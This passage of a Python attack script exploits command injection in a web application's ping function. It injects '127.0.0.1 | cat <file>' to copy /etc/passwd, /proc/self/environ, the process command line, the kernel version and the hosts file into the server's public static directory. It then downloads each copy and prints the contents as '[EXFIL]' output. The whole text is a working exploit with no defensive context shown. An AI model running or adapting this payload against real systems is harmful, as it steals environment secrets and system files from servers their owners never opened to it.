target_files = [
    ("/etc/passwd", "system_users"),
    ("/proc/version", "kernel_version"),
    ("/proc/self/cmdline", "process_cmdline"),
    ("/proc/self/environ", "environment"),
    ("/etc/hosts", "hosts_file"),
]

for filepath, desc in target_files:
    safename = filepath.replace("/", "_").strip("_")
    
    # Write file
    payload = f"127.0.0.1 | cat {filepath} > /app/static/{safename}_exfil.txt"
    print(f"\n[EXFIL] Reading {filepath}")
    status, text, elapsed = send_ping(payload)
    print(f"  Command executed (Status: {status})")
    
    # Read it back
    read_url = f"{BASE_URL}/static/{safename}_exfil.txt"
    resp = requests.get(read_url)
    print(f"  Exfil URL: {read_url}")
    print(f"  Status: {resp.status_code}")
    if resp.status_code == 200:
        content = resp.text[:300].replace('\n', ' ')
        print(f"  Content preview: {content}...")
    time.sleep(0.3)

